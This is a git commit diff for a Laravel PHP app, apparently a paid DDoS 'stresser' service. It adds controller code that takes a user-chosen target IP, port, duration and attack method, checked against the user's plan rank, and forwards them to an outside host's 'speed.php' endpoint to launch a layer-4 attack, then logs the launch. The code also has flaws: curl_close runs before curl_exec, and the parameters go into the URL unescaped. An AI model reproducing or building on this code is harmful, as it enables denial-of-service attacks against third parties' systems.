47ba6fc2916858d18e4a0c93dfe242f55092513e
DescrySama <pierrehugot35@gmail.com>
2022-04-02 16:02:26 +0200

    api

--- app/Http/Controllers/attackController.php
+++ app/Http/Controllers/attackController.php
@@ -5,6 +5,7 @@ namespace App\Http\Controllers;
 use Carbon\Carbon;
 use App\Models\attack;
 use App\Models\method;
+use GuzzleHttp\Client;
 use Illuminate\Http\Request;
 use Illuminate\Support\Facades\Auth;
 use App\Http\Controllers\planController;
@@ -35,7 +36,23 @@ class attackController extends Controller
             'length' => ['required', 'integer', planController::check(Auth::user()->rank)],
             'method' => ['required', 'string']
         ]);
-        //api layer4 attack
+
+        $client = new Client();
+        // $client->request('POST', 'http://77.83.247.18/speed.php', [
+        //     'form_params' => [
+        //         'host' => $request->ip,
+        //         'port' => $request->port,
+        //         'time' => $request->length,
+        //         'method' => $request->method
+        //     ]
+        // ]);
+
+        $url = curl_init();
+        curl_setopt($url, CURLOPT_URL,'http://77.83.247.18/speed.php?'.'host='.$request->ip.'&port='.$request->port.'&time='.$request->length.'&method='.$request->method);
+        curl_setopt($url, CURLOPT_RETURNTRANSFER, true);
+        curl_close($url);
+        curl_exec($url);
+        
         attack::create(['ip' => $request->ip, 'port' => $request->port, 'length' => $request->length, 'method' => $request->method,'launcher_id'=> Auth::user()->id, 'launched_at' => Carbon::now(), 'finished_at'=>Carbon::now()->addSecond($request->length)]);
         return redirect('/attack');
     }
